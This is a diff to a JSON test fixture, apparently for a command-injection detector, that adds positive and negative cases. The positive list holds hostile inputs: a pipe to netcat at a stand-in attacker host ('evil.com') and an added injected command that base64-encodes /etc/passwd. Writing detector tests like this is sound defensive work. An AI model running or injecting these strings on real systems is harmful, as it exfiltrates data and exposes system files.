@@ -1031,6 +1031,10 @@
       {
         "input": "| nc evil.com 4444",
         "expected": true
+      },
+      {
+        "input": "; base64 /etc/passwd",
+        "expected": true
       }
     ],
     "command_negative": [
@@ -1044,6 +1048,10 @@
       },
       {
         "input": "user 5 + 5 = 10",
+        "expected": false
+      },
+      {
+        "input": "data:image/png;base64,iVBORw0KGgo=",
         "expected": false
       }
     ],
